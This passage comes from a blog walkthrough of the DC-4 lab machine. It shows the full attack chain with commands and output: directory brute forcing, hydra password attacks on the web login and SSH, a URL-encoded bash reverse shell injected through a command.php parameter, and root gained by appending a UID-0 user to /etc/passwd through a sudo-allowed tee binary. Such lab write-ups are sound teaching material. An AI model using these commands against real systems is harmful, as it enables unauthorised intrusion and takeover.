</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 3.2.0 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.11 - 4.1 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 4.4 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 3.16 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.13 <span style=color:#f92672>(</span>91%<span style=color:#f92672>)</span>, Linux 3.10 - 3.16 <span style=color:#f92672>(</span>91%<span style=color:#f92672>)</span>, Linux 3.10 - 3.12 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 3.10 - 4.11 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 3.12 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 3.13 or 4.2 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Uptime guess: 198.841 days <span style=color:#f92672>(</span>since Sun Mar <span style=color:#ae81ff>13</span> 22:39:35 2022<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>TCP Sequence Prediction: Difficulty<span style=color:#f92672>=</span><span style=color:#ae81ff>263</span> <span style=color:#f92672>(</span>Good luck!<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>IP ID Sequence Generation: All zeros
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 22/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT      ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   69.20 ms 192.168.49.1 <span style=color:#f92672>(</span>192.168.49.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   69.37 ms 192.168.142.195 <span style=color:#f92672>(</span>192.168.142.195<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 19:50
</span></span><span style=display:flex><span>Completed NSE at 19:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:50
</span></span><span style=display:flex><span>Completed NSE at 19:50, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:50
</span></span><span style=display:flex><span>Completed NSE at 19:50, 0.00s elapsed
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 12.79 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>78</span> <span style=color:#f92672>(</span>5.316KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>36</span> <span style=color:#f92672>(</span>2.896KB<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Brute force the website for directories and files with the extension <code>.php</code> using <code>gobuster</code>.</p><ul><li>Command: <code>gobuster dir -u http://192.168.142.195/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ gobuster dir -u http://192.168.142.195/ -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://192.168.142.195/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/09/28 19:53:20 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/login.php            <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 206<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; index.php<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/images               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 170<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://192.168.142.195/images/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/index.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 506<span style=color:#f92672>]</span>                                     
</span></span><span style=display:flex><span>/css                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 170<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://192.168.142.195/css/<span style=color:#f92672>]</span>   
</span></span><span style=display:flex><span>/logout.php           <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 163<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; index.php<span style=color:#f92672>]</span>                     
</span></span><span style=display:flex><span>/command.php          <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 704<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; index.php<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/09/28 20:01:23 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>The most interesting file is <code>command.php</code> but leads to <code>index.php</code>, so maybe we have to be authenticated in order to view it.<br>Now we <code>brute force</code> the <code>admin</code> user using <code>hydra</code> and if the success message contains the word <code>command</code>, then we have successfully brute forced the password.</p><ul><li>Command: <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.195 http-post-form "/login.php:username=^USER^&password=^PASS^:S=command"</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.195 http-post-form <span style=color:#e6db74>&#34;/login.php:username=^USER^&amp;password=^PASS^:S=command&#34;</span>
</span></span><span style=display:flex><span>Hydra v9.3 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2022-09-28 19:54:50
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>14344399</span> login tries <span style=color:#f92672>(</span>l:1/p:14344399<span style=color:#f92672>)</span>, ~896525 tries per task
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking http-post-form://192.168.142.195:80/login.php:username<span style=color:#f92672>=</span>^USER^&amp;password<span style=color:#f92672>=</span>^PASS^:S<span style=color:#f92672>=</span>command
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>80<span style=color:#f92672>][</span>http-post-form<span style=color:#f92672>]</span> host: 192.168.142.195   login: admin   password: <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2022-09-28 19:55:10
</span></span></code></pre></div><p>Now we can login with username <code>admin</code> and the found password, and navigate to <code>/command.php</code>.<br>Here we can execute some commands from the UI, but if we <code>Intercept</code> a request with Burp Suite, we see it is a POST request with a parameter <code>radio</code>, which executes <code>linux</code> commands. So we can put there a bash reverse shell like the following: <code>bash -c 'exec bash -i &>/dev/tcp/192.168.49.117/443 &lt;&1'</code>, but we have to URL-encode it first. The request in Burp Suite should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>POST /command.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.142.195
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>77</span>
</span></span><span style=display:flex><span>Origin: http://192.168.142.195
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://192.168.142.195/command.php
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>h8dn71jf3jkrrdgnd7u0a525f6
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>radio<span style=color:#f92672>=</span>bash+-c+<span style=color:#e6db74>&#39;exec+bash+-i+%26&gt;/dev/tcp/192.168.49.142/443+&lt;%261&#39;</span>&amp;submit<span style=color:#f92672>=</span>Run
</span></span></code></pre></div><p>Open a netcat listener and we get a reverse shell as <code>www-data</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>192.168.49.142<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.142.195<span style=color:#f92672>]</span> <span style=color:#ae81ff>53996</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>541<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@dc-4:/usr/share/nginx/html$ python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>www-data@dc-4:/usr/share/nginx/html$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>geobour98@kali:~$ stty raw -echo;fg
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>  + continued  nc -lvnp <span style=color:#ae81ff>443</span> 
</span></span><span style=display:flex><span>www-data@dc-4:/usr/share/nginx/html$ export TERM<span style=color:#f92672>=</span>xterm-256color
</span></span><span style=display:flex><span>www-data@dc-4:/usr/share/nginx/html$ stty rows <span style=color:#ae81ff>38</span> cols <span style=color:#ae81ff>111</span>
</span></span><span style=display:flex><span>www-data@dc-4:/usr/share/nginx/html$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Navigate to <code>/home/jim</code> and we see <code>local.txt</code>. Also, we see an interesting folder <code>backups</code>, which contains the file <code>old-passwords.bak</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@dc-4:/home/jim$ cat local.txt 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>www-data@dc-4:/home/jim$ cd backups
</span></span><span style=display:flex><span>www-data@dc-4:/home/jim/backups$ ls 
</span></span><span style=display:flex><span>old-passwords.bak
</span></span></code></pre></div><p>Then, transfer <code>old-passwords.bak</code> to the attacker machine and <code>brute force</code> the user <code>jim</code> with the found wordlist. We will use <code>hydra</code> again.</p><ul><li>Command: <code>hydra -l jim -P old-passwords.bak ssh://192.168.142.195</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ hydra -l jim -P old-passwords.bak ssh://192.168.142.195
</span></span><span style=display:flex><span>Hydra v9.3 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2022-09-28 20:05:55
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>252</span> login tries <span style=color:#f92672>(</span>l:1/p:252<span style=color:#f92672>)</span>, ~16 tries per task
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ssh://192.168.142.195:22/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>STATUS<span style=color:#f92672>]</span> 146.00 tries/min, <span style=color:#ae81ff>146</span> tries in 00:01h, <span style=color:#ae81ff>109</span> to <span style=color:#66d9ef>do</span> in 00:01h, <span style=color:#ae81ff>13</span> active
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>STATUS<span style=color:#f92672>]</span> 105.50 tries/min, <span style=color:#ae81ff>211</span> tries in 00:02h, <span style=color:#ae81ff>44</span> to <span style=color:#66d9ef>do</span> in 00:01h, <span style=color:#ae81ff>13</span> active
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 192.168.142.195   login: jim   password: <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Writing restore file because <span style=color:#ae81ff>3</span> final worker threads did not complete <span style=color:#66d9ef>until</span> end.
</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2022-09-28 20:08:10
</span></span></code></pre></div><p>Now we can login with <code>SSH</code> as the user <code>jim</code> with the found password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ ssh jim@192.168.142.195                                     
</span></span><span style=display:flex><span>The authenticity of host <span style=color:#e6db74>&#39;192.168.142.195 (192.168.142.195)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ED25519 key fingerprint is SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>This key is not known by any other names
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Warning: Permanently added &#39;</span>192.168.142.195<span style=color:#e6db74>&#39; (ED25519) to the list of known hosts.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>jim@192.168.142.195&#39;</span>s password: 
</span></span><span style=display:flex><span>Linux dc-4 4.9.0-3-686 <span style=color:#75715e>#1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style=display:flex><span>the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
</span></span><span style=display:flex><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style=display:flex><span>permitted by applicable law.
</span></span><span style=display:flex><span>You have mail.
</span></span><span style=display:flex><span>Last login: Sun Apr  <span style=color:#ae81ff>7</span> 02:23:55 <span style=color:#ae81ff>2019</span> from 192.168.0.100
</span></span><span style=display:flex><span>jim@dc-4:~$
</span></span></code></pre></div><p>Then, we run <code>find</code> command to find files owned by <code>jim</code>. The most interesting is <code>/var/mail/jim</code>, which contains the password of user <code>charles</code>. So, we switch to that user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>jim@dc-4:~$ find / -type f -user jim 2&gt;/dev/null
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/var/mail/jim
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>jim@dc-4:~$ cat /var/mail/jim
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Hi Jim,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>I<span style=color:#960050;background-color:#1e0010>&#39;</span>m heading off on holidays at the end of today, so the boss asked me to give you my password just in <span style=color:#66d9ef>case</span> anyt
</span></span><span style=display:flex><span>hing goes wrong.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Password is:  <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>See ya,
</span></span><span style=display:flex><span>Charles
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>jim@dc-4:~$ su charles
</span></span><span style=display:flex><span>Password: 
</span></span><span style=display:flex><span>charles@dc-4:/home/jim$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>charles<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>charles<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>charles<span style=color:#f92672>)</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>After executing the command: <code>sudo -l</code> we see that we can execute <code>/usr/bin/teehee</code> as <code>root</code>. If we run <code>strings</code> command on <code>/usr/bin/teehee</code> we will find the help menu of that binary.<br>Then we can execute it with the <code>-a</code> option to append a new user with both GID and UID as 0 (as <code>root</code>) at <code>/etc/passwd</code>.<br>Before running <code>/usr/bin/teehee</code> we must generate a hash of a password (geobour98 in my case) with <code>openssl</code> in order to put it in <code>/etc/passwd</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>charles@dc-4:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> charles on dc-4:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User charles may run the following commands on dc-4:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/teehee
</span></span><span style=display:flex><span>charles@dc-4:~$ strings /usr/bin/teehee
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Try <span style=color:#e6db74>&#39;%s --help&#39;</span> <span style=color:#66d9ef>for</span> more information.                                                              
</span></span><span style=display:flex><span>Usage: %s <span style=color:#f92672>[</span>OPTION<span style=color:#f92672>]</span>... <span style=color:#f92672>[</span>FILE<span style=color:#f92672>]</span>...                                                                    
</span></span><span style=display:flex><span>Copy standard input to each FILE, and also to standard output.                                     
</span></span><span style=display:flex><span>  -a, --append              append to the given FILEs, <span style=color:#66d9ef>do</span> not overwrite                            
</span></span><span style=display:flex><span>  -i, --ignore-interrupts   ignore interrupt signals                                               
</span></span><span style=display:flex><span>  -p                        diagnose errors writing to non pipes                                   
</span></span><span style=display:flex><span>      --output-error<span style=color:#f92672>[=</span>MODE<span style=color:#f92672>]</span>   set behavior on write error.  See MODE below                         
</span></span><span style=display:flex><span>      --help     display this help and exit                                                        
</span></span><span style=display:flex><span>      --version  output version information and exit                                               
</span></span><span style=display:flex><span>MODE determines behavior with write errors on the outputs:                                         
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;warn&#39;</span>         diagnose errors writing to any output                                             
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;warn-nopipe&#39;</span>  diagnose errors writing to any output not a pipe                                  
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;exit&#39;</span>         exit on error writing to any output                                               
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;exit-nopipe&#39;</span>  exit on error writing to any output not a pipe
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>charles@dc-4:~$ openssl passwd geobour98
</span></span><span style=display:flex><span>Warning: truncating password to <span style=color:#ae81ff>8</span> characters
</span></span><span style=display:flex><span>GWIOrZOActC.A
</span></span><span style=display:flex><span>charles@dc-4:~$ sudo /usr/bin/teehee -a /etc/passwd                                                
</span></span><span style=display:flex><span>geobour98:GWIOrZOActC.A:0:0:::/bin/bash                                                                         
</span></span><span style=display:flex><span>geobour98:GWIOrZOActC.A:0:0:::/bin/bash                                                                         
</span></span><span style=display:flex><span>^C                                                                                                 
</span></span><span style=display:flex><span>charles@dc-4:~$ cat /etc/passwd
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>geobour98:GWIOrZOActC.A:0:0:::/bin/bash
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>charles@dc-4:~$ su geobour98
</span></span><span style=display:flex><span>Password: 
</span></span><span style=display:flex><span>root@dc-4:/home/charles# id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@dc-4:/home/charles# cat /root/proof.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Proof of Concept (PoC image):
<img src=../../../pg/dc-4/dc-4.png alt="DC-4 photo" style=width:700px;height:300px></p><ul class=post-tags><li><a href=https://geobour98.com/tags/linux/><strong>linux</strong></a></li><li><a href=https://geobour98.com/tags/web/><strong>web</strong></a><li><li><a href=https://geobour98.com/tags/php/><strong>php</strong></a></li><li><a href=https://geobour98.com/tags/hydra/><strong>hydra</strong></a><li><li><a href=https://geobour98.com/tags/ssh/><strong>ssh</strong></a></li><li><a href=https://geobour98.com/tags/sudo/><strong>sudo</strong></a></li><li><a href=https://geobour98.com/tags/teehee/><strong>teehee</strong></a></li><li><a href=https://geobour98.com/tags/openssl/><strong>openssl</strong></a></li></ul></div><footer class=post-footer></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const 